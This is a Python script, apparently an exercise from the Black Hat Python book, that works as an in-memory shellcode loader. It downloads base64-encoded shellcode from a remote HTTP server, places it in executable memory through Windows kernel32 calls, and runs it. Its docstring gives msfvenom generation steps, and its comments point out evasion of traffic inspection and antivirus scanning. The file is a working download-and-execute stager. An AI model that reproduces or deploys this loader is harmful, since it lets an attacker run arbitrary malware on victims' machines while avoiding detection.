"""
Black Hat Python - Chapter 8
Shellcode Execution using ctypes
Fetches base64-encoded shellcode from a web server and executes it in memory.

HOW TO USE:
-----------
Step 1: On your Kali/Linux machine, generate shellcode with msfvenom:
    msfvenom -p windows/exec -e x86/shikata_ga_nai -i 1 -f raw cmd=calc.exe > shellcode.raw

Step 2: Base64 encode it:
    base64 -w 0 -i shellcode.raw > shellcode.bin

Step 3: Serve it over HTTP:
    python -m http.server 8100

Step 4: Update the URL below with your Linux machine's IP and run this script on Windows:
    python shell_exec.py

Requirements:
    No extra pip installs needed — uses only built-in ctypes and urllib
"""

from urllib import request
import base64
import ctypes


# ---------------------------------------------------------------
# Point this to your web server hosting the base64 shellcode
# Replace the IP with your actual Linux/Kali machine IP
# ---------------------------------------------------------------
TARGET_URL = "http://192.168.56.102:8100/shellcode.bin"


# Get direct access to Windows kernel32.dll
kernel32 = ctypes.windll.kernel32


def get_code(url):
    """
    Fetches base64-encoded shellcode from the given URL
    and decodes it into raw bytes.

    Why base64? Raw binary over HTTP can get mangled.
    Base64 keeps it clean and harder to detect in traffic.
    """
    with request.urlopen(url) as response:
        # Read the response and decode from base64 to raw bytes
        shellcode = base64.decodebytes(response.read())
    return shellcode


def write_memory(buf):
    """
    Allocates executable memory and copies shellcode into it.

    Two critical Windows API calls:
    - VirtualAlloc: reserves + commits a memory region with execute permissions
    - RtlMoveMemory: copies bytes into that memory region
    """
    length = len(buf)

    # IMPORTANT: Tell ctypes the correct return type for VirtualAlloc
    # Without this, on 64-bit Python the pointer gets truncated to 32-bit
    # and you'll get a crash or wrong memory address
    kernel32.VirtualAlloc.restype = ctypes.c_void_p

    # IMPORTANT: Tell ctypes the correct argument types for RtlMoveMemory
    # (destination pointer, source pointer, size)
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,  # destination — where to copy TO
        ctypes.c_void_p,  # source      — where to copy FROM
        ctypes.c_size_t   # size        — how many bytes to copy
    )

    # Allocate memory for the shellcode:
    # None       = let Windows choose the address
    # length     = how much memory to allocate
    # 0x3000     = MEM_COMMIT | MEM_RESERVE (allocate and commit in one step)
    # 0x40       = PAGE_EXECUTE_READWRITE (memory can be read, written, executed)
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)

    # Copy the shellcode bytes into the allocated memory region
    kernel32.RtlMoveMemory(ptr, buf, length)

    return ptr  # return the memory address where shellcode now lives


def run(shellcode):
    """
    Writes shellcode into executable memory and runs it.

    The trick:
    - create_string_buffer wraps the bytes in a mutable ctypes buffer
    - write_memory puts it into executable memory
    - ctypes.cast turns the memory address into a callable function pointer
    - Calling shell_func() executes the shellcode
    """
    # Create a mutable ctypes buffer from the raw shellcode bytes
    buffer = ctypes.create_string_buffer(shellcode)

    # Write shellcode into executable memory and get its address
    ptr = write_memory(buffer)

    # Cast the memory address to a C function pointer that takes no args
    # CFUNCTYPE(None) = a void function with no parameters
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))

    # Call it — this executes the shellcode directly in memory
    # No file written to disk, no AV scan triggered
    shell_func()


if __name__ == '__main__':
    print(f'[*] Fetching shellcode from: {TARGET_URL}')
    shellcode = get_code(TARGET_URL)
    print(f'[*] Got {len(shellcode)} bytes of shellcode')
    print(f'[*] Writing to executable memory and running...')
    run(shellcode)